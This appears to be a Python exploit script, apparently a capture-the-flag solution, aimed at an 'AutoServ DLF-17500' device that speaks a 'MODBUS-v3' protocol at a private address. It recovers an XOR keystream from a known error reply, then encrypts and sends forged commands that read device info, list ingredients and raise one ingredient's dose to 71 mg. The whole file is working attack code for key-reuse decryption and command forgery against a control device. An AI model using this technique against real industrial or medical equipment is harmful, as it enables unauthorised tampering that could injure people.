import binascii
import socket
import re

def x(a,b):
    l=0
    ret=""
    if len(a)>len(b):
        l=len(b)
    else:
        l=len(a)
    for i in range(0,l):
        ret+=chr(bytearray(a)[i]^bytearray(b)[i])

    return ret




#got=bytearray("\xc4\x23\xb9\x61\x2d\xbc\xcc\x9f\xea\x1d\xb4\xa0\x43\x1b\xfc\xbf\x0d\x88\x87\x42\x3d\xe5")
orig=bytearray("CODE=UNKNOW PROTOCOL\n\n")
comm=bytearray("MODBUS-v3\nCODE=INFO\n\n")
info=bytearray("CODE=OK\nDESC=AutoServ DLF-17500\nPROTOCOL=MODBUS-v3\nSTATUS=OK\nVERSION=2.3.1")
lst=bytearray("MODBUS-v3\nCODE=LIST\n\n")


sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.105.0.54", 6699))
#sock.send(binascii.unhexlify("000000000000000000000000000000000000000000000000000000000000000000000000000000000a85b4a9dc151c2cd83d20bcda59eeb25ab89a128087"+"00"))
#sock.send(binascii.unhexlify("000000000000000000000000000000000000000000000000000000000000000000000000000000000a85b4a9dc666c2cd83d20bcda59eeb25ab89a128000"+"00"))
#sock.send("\x0a"*62+"\x00")
sock.send(binascii.unhexlify("000000000000000000000000000000000000000000000000000000000000000000000000000000000a")+("\x31"*21+"\x00"))
oracle=sock.recv(1024)
keystream=x(orig,oracle)


print binascii.hexlify(oracle)
print binascii.hexlify(keystream)
print "OOO: "+binascii.hexlify(x(keystream,comm))

sock.close()
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.105.0.54", 6699))
sock.send(binascii.unhexlify("000000000000000000000000000000000000000000000000000000000000000000000000000000000a")+x(keystream,comm))
info_data=sock.recv(len(info))
keystream2=x(info_data,info)
print x(keystream2,info_data)
sock.close()

sock.close()
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.105.0.54", 6699))
sock.send(binascii.unhexlify("000000000000000000000000000000000000000000000000000000000000000000000000000000000a")+x(keystream2,lst))
lst_data=sock.recv(1024)
lst_dec=x(keystream2,lst_data)
ingredient=re.search("([A-Za-z]+)=[0-9]+ mg",lst_dec).group(1)
sock.close()


bingo=bytearray("MODBUS-v3\nCODE=INC\nINGREDIENT=%s\nVALUE=71\n\n"%ingredient)
print bingo
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.105.0.54", 6699))
sock.send(binascii.unhexlify("000000000000000000000000000000000000000000000000000000000000000000000000000000000a")+x(keystream2,bingo))
bingo_data=sock.recv(1024)
print x(keystream2,bingo_data)